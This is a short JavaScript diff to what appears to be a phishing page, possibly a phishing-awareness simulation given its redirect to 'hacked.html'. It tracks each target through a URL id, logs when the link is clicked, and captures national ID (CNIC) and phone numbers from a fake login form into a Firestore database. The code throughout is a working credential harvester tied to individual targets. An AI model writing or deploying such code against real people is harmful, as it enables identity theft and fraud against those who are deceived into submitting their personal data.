@@ -1,17 +1,18 @@
 const params = new URLSearchParams(window.location.search);
 const userId = params.get("id") || "unknown";
 
-// Page load = CLICK TRACK
+// LOG 1: User clicked the link (page loaded)
 window.addEventListener("load", function () {
     db.collection("logs").add({
         userId: userId,
-        event: "page_load",
+        event: "link_clicked",
         timestamp: new Date().toISOString()
     })
+    .then(() => console.log("Link click logged"))
     .catch(err => console.error(err));
 });
 
-// Form submit
+// LOG 2: User submitted their credentials
 document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
@@ -20,13 +21,12 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
 
     db.collection("logs").add({
         userId: userId,
-        event: "form_submit",
+        event: "form_submitted",
         cnic: cnic,
         phone: phone,
         timestamp: new Date().toISOString()
     })
     .then(() => {
-        // Redirect to hacked.html after credentials are submitted
         window.location.href = "hacked.html";
     })
     .catch(err => console.error(err));
